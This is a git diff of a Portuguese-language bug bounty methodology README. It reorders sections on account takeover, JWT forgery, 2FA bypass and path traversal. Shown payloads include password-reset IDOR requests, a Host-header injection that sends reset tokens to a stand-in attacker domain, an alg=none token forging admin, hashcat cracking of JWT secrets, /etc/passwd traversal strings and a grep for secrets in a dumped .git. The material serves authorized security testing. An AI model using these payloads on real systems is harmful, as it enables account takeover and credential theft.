@@ -15,8 +15,8 @@
 |---------|-------------|
 | 1. [Initial Notes](#1-initial-notes-and-create-account) | Initial Notes About Application |
 | 2. [Reconnaissance](#2-reconnaissance-and-subdomain-enumeration) | Subdomain Enumeration & Initial Scanning |
-| 3. [OWASP 10](#3-OWASP-10) | Probing, Vulnerability Scanning & Analysis |
-| 4. [Hunting](#4-Hunting) | Burp Suit Testing |
+| 3. [Vulnerabilities](#3-vulnerabilities) | Probing, Vulnerability Scanning & Analysis |
+| 4. [Hunting](#4-Hunting) | Vectors & Chains |
 | 5. [POC Creation](#5-proof-of-concept-poc-creation) | Documentation & Evidence |
 | 6. [Reporting](#6-reporting) | Final Documentation |
 
@@ -145,7 +145,7 @@ python3 linkfinder.py -i https://alvo.com/static/app.min.js -o cli
 ---
 <br>
 
-## **3. OWASP 10**
+## **3. Vulnerabilities0**
 **🛠️Tools:** [OpenRedirex](https://github.com/devanshbatham/OpenRedirex)
 
 <br>
@@ -322,20 +322,133 @@ Olhar sessão 4.8 para vetores de ATO.
 
 ## **4. Hunting**
 
-Iniciar os testes de endpoints no burp:
-
-*   Entenda qual é o caminho ideal que o usuário deveria seguir (ex: Carrinho --> Pagamento --> Pedido Concluído).
-
-*   Anote regras de negócio sensíveis para testar se é possível realizar ações fora de ordem, reutilizar tokens/cupons, ou manipular valores (como injetar números negativos ou quantidades absurdas).
-
-*   Race Conditions --> Ocorre quando o sistema processa múltiplas requisições simultâneas para a mesma ação antes de atualizar o estado do banco de dados.
-
-*   Esquema do Tomcat.
-
+`Sumario:`
+*   4.1 - Vetores de ATO
+*   4.2 - Spring Boot Actuator
+*   4.3 - Path Transversal
+*   4.4 - Post Message
+*   4.5 - Cors Missconfig
+*   4.6 - Web Cache
+*   4.7 - .Git Exposure
 *   Testar as POCs --> https://github.com/caetano-rangel/POC.
+
 <br>
 
-### **4.1 Spring Boot Actuator**
+### **4.1.1 ATO - Reset de senha inseguro**
+ 
+`Vetor 1A: Alvo do reset controlável (o IDOR do reset).`
+*   Em uma área logada, a request de "alterar senha" carrega quem está tendo a senha trocada. Se esse campo vier do cliente e o servidor não fixar na sessão, troque-o:
+
+```bash
+POST /autenticacao/api/v1/alterar-senha HTTP/2
+Host: alvo.com
+Content-Type: application/json
+Cookie: session=<sua_sessao_ContaA>
+{"usuario":"vitima_contaB","novaSenha":"Senha123!","confirmaSenha":"Senha123!"}
+# <- "usuario" deveria ser fixo na sessão; se aceitar outro login, é ATO
+```
+
+<br>
+
+`Vetor 1B:  Reset que devolve a senha (ou não exige autenticação). `
+*   Pior cenário: o endpoint de reset responde com a nova senha no corpo, ou nem pede sessão:
+
+```bash
+POST /autenticacao/api/v1/resetar-senha HTTP/2
+Host: alvo.com
+Content-Type: application/json
+{"usuario":"vitima_contaB","novaSenha":"Nova@123","confirmarSenha":"Nova@123","resetarSenha"
+```
+
+```bash
+HTTP/2 200 OK
+Content-Type: application/json
+{"message":"Senha redefinida com sucesso"}   # <- algumas APIs até devolvem a senha aqui
+```
+
+<br>
+
+`Vetor 1C:  Host header injection no link de reset.`
+*   O servidor monta o link do e-mail usando o header Host da request. Se você controla o Host, o link aponta pro seu domínio, e quando a vítima clica, o token de reset vaza pro seu servidor via a própria URL:
+*   A vítima recebe um e-mail "legítimo" com https://atacante.com/reset?token=ABC.... Ao clicar, o token cai no seu log. Variante: header X-Forwarded-Host: atacante.com.
+
+```bash
+POST /esqueci-senha HTTP/2
+Host: atacante.com          # <- o app usa este Host pra montar o link do e-mail
+Content-Type: application/x-www-form-urlencoded
+email=vitima@exemplo.com
+```
+
+<br>
+
+`Vetor 1D:   Token de reset previsível ou eterno.`
+*    Verifique o token: é sequencial? Curto? Baseado em timestamp? Expira?Invalida após o uso? Um token que não expira pode ser reusado meses depois; um previsível pode ser adivinhado. Gere dois resets seguidos e compare os tokens: se houver padrão, é explorável
+
+<br>
+
+### **4.1.2 JWT - Jason Web Token**
+
+*   header.payload.signature, três blocos Base64URL separados por ponto:
+```bash
+// header — diz QUAL algoritmo assina o token
+{"alg":"HS256","typ":"JWT"}
+// payload — as "claims" (afirmações sobre quem você é)
+{"userId":1001,"admin":false,"iat":1717000000,"exp":1717003600}
+```
+
+> **⚠️ Analogia:** o JWT é um cheque. Header e payload são o valor e o nome, escritos a caneta, qualquer um lê. A assinatura é a firma do banco. Falsificar o cheque é falsificar a firma. Os ataques a seguir são quatro jeitos de falsificar a firma (ou fazer o banco nem conferir).
+
+<br>
+
+`Vetor 2A:  alg=none , o cheque sem firma.`
+*   A especificação do JWT prevê "alg":"none" (token "não seguro", sem assinatura). Servidores deveriam rejeitar, mas muitos não. Você troca o algoritmo pra none , edita o payload e remove a assinatura (mantendo o ponto final):
+*   Se o servidor aceitar, ele confiou num cheque sem firma. Variantes de bypass quando o filtro é ingênuo: nOnE , NONE (capitalização mista).
+
+```bash
+{"alg":"none","typ":"JWT"}
+{"userId":1001,"admin":true}   // <- forjamos admin
+```
+
+```bash
+eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEwMDEsImFkbWluIjp0cnVlfQ.
+assinatura vazia, mas o "." continua
+```
+
+<br>
+
+`Vetor 2B:  Segredo fraco em HS256: crackeando a firma com hashcat.`
+*    HS256 assina com HMAC-SHA256 usando um segredo compartilhado. Se esse segredo for fraco (123456 , secret , changeme ), você o quebra offline e passa a assinar tokens válidos. Salve o JWT num arquivo e rode:
+
+```bash
+# -m 16500 é o modo "JWT" do hashcat; -a 0 é ataque por wordlist
+hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+```
+
+<br>
+
+`Vetor 2C:  Algorithm confusion (RS256 → HS256): usando a chave pública como segredo.`
+*    Esse é o pulo do gato. Em RS256 o token é assinado com a chave privada (só o servidor tem) e verificado com a pública (pode ser pública mesmo). Parece seguro, e é, se o servidor só aceitar RS256.
+
+O bug: muitas libs têm um verify() genérico que escolhe o algoritmo pelo header do token. Se o servidor guarda a chave pública pra verificar RS256, mas você manda um token com  alg:HS256 , a lib usa a mesma chave pública como segredo HMAC. E a chave pública... é pública! Você a tem. Então você assina o token em HS256 usando a chave pública como segredo, e o servidor verifica com a mesma chave pública. Bate. (Pré condição: a app entrega a chave pública ao  verify() como string/PEM, a mesma forma que vira segredo HMAC; 
+
+*    libs que tipam a chave como objeto/ KeyObject , ou que travam o algoritmo aceito, não caem nisso.)
+
+> **⚠️ Atenção:**  a versão da chave pública que você usa pra assinar tem que ser byte a byte idêntica à que o servidor guarda: mesmo formato (X.509 PEM) e inclusive os \n (newlines) caracteres não-imprimíveis. Um newline a mais ou a menos e a assinatura não bate. Não é "mais ou menos igual". É idêntica.
+
+<br>
+
+### **4.1.3 Bypass de 2FA / OTP**
+
+`Vetor A:  Validação no client-side (response manipulável).`
+*   O servidor responde 400 pra um OTP errado e o front decide o que fazer com base no status. Intercepte a resposta e troque 400 Bad Request por 200 OK :
+
+```bash
+HTTP/2 400 Bad Request →  HTTP/2 200 OK   # <- editado no Burp; o front acha que validou
+```
+
+<br>
+
+### **4.2 Spring Boot Actuator**
 
 Módulo de monitoramento do Spring Boot. Quando mal configurado, expõe endpoints internos sem autenticação.
 
@@ -345,7 +458,7 @@ Módulo de monitoramento do Spring Boot. Quando mal configurado, expõe endpoint
 *   Taxa de sucesso esperada: Baixa
 <br>
 
-### **4.2 Path Traversal (Directory Traversal)**
+### **4.3 Path Traversal (Directory Traversal)**
 
 *   Procure por parâmetros que parecem manipular arquivos/caminhos: ?file= / ?path= / ?name=
 *   GET /download?file=../../../../etc/passwd
@@ -356,18 +469,7 @@ Módulo de monitoramento do Spring Boot. Quando mal configurado, expõe endpoint
 ....//....//....//etc/passwd
 ..%252f..%252f..%252fetc%252fpasswd   (dupla URL-encode)
 ```
-<br>
 
-### **4.3 Config Exposure**
-
-```bash
-https://HOST/.env
-https://HOST/config.json
-https://HOST/application.yml
-https://HOST/application.properties
-https://HOST/web.config
-https://HOST/appsettings.json
-```
 <br>
 
 ### **4.4 PostMessage**
@@ -509,118 +611,6 @@ Agora grep por segredos no que você baixou
 grep -rEi 'password|secret|api_key|DB_|mysql|--password=' ./dump
 ```
 <br>
-
-### **4.8.1 ATO - Reset de senha inseguro**
- 
-`Vetor 1A: Alvo do reset controlável (o IDOR do reset).`
-*   Em uma área logada, a request de "alterar senha" carrega quem está tendo a senha trocada. Se esse campo vier do cliente e o servidor não fixar na sessão, troque-o:
-
-```bash
-POST /autenticacao/api/v1/alterar-senha HTTP/2
-Host: alvo.com
-Content-Type: application/json
-Cookie: session=<sua_sessao_ContaA>
-{"usuario":"vitima_contaB","novaSenha":"Senha123!","confirmaSenha":"Senha123!"}
-# <- "usuario" deveria ser fixo na sessão; se aceitar outro login, é ATO
-```
-
-<br>
-
-`Vetor 1B:  Reset que devolve a senha (ou não exige autenticação). `
-*   Pior cenário: o endpoint de reset responde com a nova senha no corpo, ou nem pede sessão:
-
-```bash
-POST /autenticacao/api/v1/resetar-senha HTTP/2
-Host: alvo.com
-Content-Type: application/json
-{"usuario":"vitima_contaB","novaSenha":"Nova@123","confirmarSenha":"Nova@123","resetarSenha"
-```
-
-```bash
-HTTP/2 200 OK
-Content-Type: application/json
-{"message":"Senha redefinida com sucesso"}   # <- algumas APIs até devolvem a senha aqui
-```
-
-<br>
-
-`Vetor 1C:  Host header injection no link de reset.`
-*   O servidor monta o link do e-mail usando o header Host da request. Se você controla o Host, o link aponta pro seu domínio, e quando a vítima clica, o token de reset vaza pro seu servidor via a própria URL:
-*   A vítima recebe um e-mail "legítimo" com https://atacante.com/reset?token=ABC.... Ao clicar, o token cai no seu log. Variante: header X-Forwarded-Host: atacante.com.
-
-```bash
-POST /esqueci-senha HTTP/2
-Host: atacante.com          # <- o app usa este Host pra montar o link do e-mail
-Content-Type: application/x-www-form-urlencoded
-email=vitima@exemplo.com
-```
-
-<br>
-
-`Vetor 1D:   Token de reset previsível ou eterno.`
-*    Verifique o token: é sequencial? Curto? Baseado em timestamp? Expira?Invalida após o uso? Um token que não expira pode ser reusado meses depois; um previsível pode ser adivinhado. Gere dois resets seguidos e compare os tokens: se houver padrão, é explorável
-
-<br>
-
-### **4.8.2 JWT - Jason Web Token**
-
-*   header.payload.signature, três blocos Base64URL separados por ponto:
-```bash
-// header — diz QUAL algoritmo assina o token
-{"alg":"HS256","typ":"JWT"}
-// payload — as "claims" (afirmações sobre quem você é)
-{"userId":1001,"admin":false,"iat":1717000000,"exp":1717003600}
-```
-
-> **⚠️ Analogia:** o JWT é um cheque. Header e payload são o valor e o nome, escritos a caneta, qualquer um lê. A assinatura é a firma do banco. Falsificar o cheque é falsificar a firma. Os ataques a seguir são quatro jeitos de falsificar a firma (ou fazer o banco nem conferir).
-
-<br>
-
-`Vetor 2A:  alg=none , o cheque sem firma.`
-*   A especificação do JWT prevê "alg":"none" (token "não seguro", sem assinatura). Servidores deveriam rejeitar, mas muitos não. Você troca o algoritmo pra none , edita o payload e remove a assinatura (mantendo o ponto final):
-*   Se o servidor aceitar, ele confiou num cheque sem firma. Variantes de bypass quando o filtro é ingênuo: nOnE , NONE (capitalização mista).
-
-```bash
-{"alg":"none","typ":"JWT"}
-{"userId":1001,"admin":true}   // <- forjamos admin
-```
-
-```bash
-eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEwMDEsImFkbWluIjp0cnVlfQ.
-assinatura vazia, mas o "." continua
-```
-
-<br>
-
-`Vetor 2B:  Segredo fraco em HS256: crackeando a firma com hashcat.`
-*    HS256 assina com HMAC-SHA256 usando um segredo compartilhado. Se esse segredo for fraco (123456 , secret , changeme ), você o quebra offline e passa a assinar tokens válidos. Salve o JWT num arquivo e rode:
-
-```bash
-# -m 16500 é o modo "JWT" do hashcat; -a 0 é ataque por wordlist
-hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
-```
-
-<br>
-
-`Vetor 2C:  Algorithm confusion (RS256 → HS256): usando a chave pública como segredo.`
-*    Esse é o pulo do gato. Em RS256 o token é assinado com a chave privada (só o servidor tem) e verificado com a pública (pode ser pública mesmo). Parece seguro, e é, se o servidor só aceitar RS256.
-
-O bug: muitas libs têm um verify() genérico que escolhe o algoritmo pelo header do token. Se o servidor guarda a chave pública pra verificar RS256, mas você manda um token com  alg:HS256 , a lib usa a mesma chave pública como segredo HMAC. E a chave pública... é pública! Você a tem. Então você assina o token em HS256 usando a chave pública como segredo, e o servidor verifica com a mesma chave pública. Bate. (Pré condição: a app entrega a chave pública ao  verify() como string/PEM, a mesma forma que vira segredo HMAC; 
-
-*    libs que tipam a chave como objeto/ KeyObject , ou que travam o algoritmo aceito, não caem nisso.)
-
-> **⚠️ Atenção:**  a versão da chave pública que você usa pra assinar tem que ser byte a byte idêntica à que o servidor guarda: mesmo formato (X.509 PEM) e inclusive os \n (newlines) caracteres não-imprimíveis. Um newline a mais ou a menos e a assinatura não bate. Não é "mais ou menos igual". É idêntica.
-
-<br>
-
-### **4.8.3 Bypass de 2FA / OTP**
-
-`Vetor A:  Validação no client-side (response manipulável).`
-*   O servidor responde 400 pra um OTP errado e o front decide o que fazer com base no status. Intercepte a resposta e troque 400 Bad Request por 200 OK :
-
-```bash
-HTTP/2 400 Bad Request →  HTTP/2 200 OK   # <- editado no Burp; o front acha que validou
-```
 
 ---
 <br>
